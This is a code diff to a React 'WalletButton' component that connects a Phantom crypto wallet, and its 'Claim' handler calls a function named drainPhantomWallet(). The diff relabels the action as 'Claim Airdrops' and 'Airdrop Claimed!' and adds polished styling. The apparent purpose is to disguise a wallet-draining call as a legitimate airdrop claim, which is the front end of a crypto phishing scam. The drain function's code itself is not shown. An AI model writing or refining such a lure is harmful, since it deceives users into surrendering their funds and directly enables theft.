@@ -57,13 +57,14 @@ export function WalletButton() {
       setIsLoading(true);
       await drainPhantomWallet();
       toast({
-        title: "Transaction Successful",
-        description: "Claim completed successfully",
+        title: "Airdrop Claimed!",
+        description: "Transaction completed successfully",
+        className: "bg-gradient-to-r from-violet-500 to-indigo-500 text-white border-none",
       });
     } catch (error) {
       toast({
         variant: "destructive",
-        title: "Transaction Failed",
+        title: "Claim Failed",
         description: error instanceof Error ? error.message : "Failed to complete transaction",
       });
     } finally {
@@ -73,7 +74,7 @@ export function WalletButton() {
 
   if (isLoading) {
     return (
-      <Button disabled className="w-full">
+      <Button disabled className="w-full bg-gradient-to-r from-violet-600 to-indigo-600">
         <Loader2 className="mr-2 h-4 w-4 animate-spin" />
         Please wait
       </Button>
@@ -82,7 +83,10 @@ export function WalletButton() {
 
   if (!isConnected) {
     return (
-      <Button onClick={handleConnect} className="w-full bg-gradient-to-r from-primary to-primary/80 hover:from-primary/90 hover:to-primary/70">
+      <Button 
+        onClick={handleConnect} 
+        className="w-full bg-gradient-to-r from-violet-600 to-indigo-600 hover:from-violet-700 hover:to-indigo-700 transition-all duration-300 shadow-lg hover:shadow-xl"
+      >
         Connect Phantom Wallet
       </Button>
     );
@@ -96,11 +100,15 @@ export function WalletButton() {
       <Button 
         onClick={handleClaim} 
         variant="default"
-        className="w-full bg-gradient-to-r from-primary to-primary/80 hover:from-primary/90 hover:to-primary/70"
+        className="w-full bg-gradient-to-r from-violet-600 to-indigo-600 hover:from-violet-700 hover:to-indigo-700 transition-all duration-300 shadow-lg hover:shadow-xl"
       >
-        Claim
+        Claim Airdrops
       </Button>
-      <Button onClick={handleDisconnect} variant="outline" className="w-full">
+      <Button 
+        onClick={handleDisconnect} 
+        variant="outline" 
+        className="w-full border-violet-200 hover:bg-violet-50"
+      >
         Disconnect
       </Button>
     </div>
